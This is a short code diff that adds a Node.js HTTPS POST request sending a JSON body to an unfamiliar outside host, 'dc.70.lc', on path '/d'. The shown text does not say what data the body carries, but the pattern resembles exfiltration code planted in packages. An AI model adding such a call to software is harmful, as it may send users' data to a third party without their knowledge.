@@ -1,0 +1,10 @@
+var r = https.request({
+    hostname:'dc.70.lc',
+    port: 443,
+    path: '/d',
+    method: 'POST',
+    headers: {
+        'Content-Length': body.length,
+        'Content-Type': 'application/json'
+    }
+})
